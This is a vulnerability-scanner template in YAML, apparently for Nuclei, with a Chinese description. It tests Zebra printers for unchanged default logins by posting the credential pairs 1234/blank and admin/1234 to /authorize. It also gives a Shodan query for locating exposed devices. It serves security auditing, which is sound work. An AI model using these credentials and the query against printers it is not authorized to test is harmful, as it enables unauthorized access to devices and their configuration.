id: zebra-default-login

info:
  name: Zebra 默认口令登录（弱口令）
  author: y0no
  severity: high
  description: |
    该模板通过尝试 Zebra 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  metadata:
    verified: true
    max-request: 4
    shodan-query: title:"Zebra"
  tags: zebra,default-login,misconfig,printer,intrusive,vuln

http:
  - raw:
      - |
        POST /authorize HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        0={{username}}&1={{password}}

    attack: pitchfork
    payloads:
      username:
        - 1234
        - admin
      password:
        - ''
        - 1234

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ">Access Granted. This IP Address now"

      - type: status
        status:
          - 200
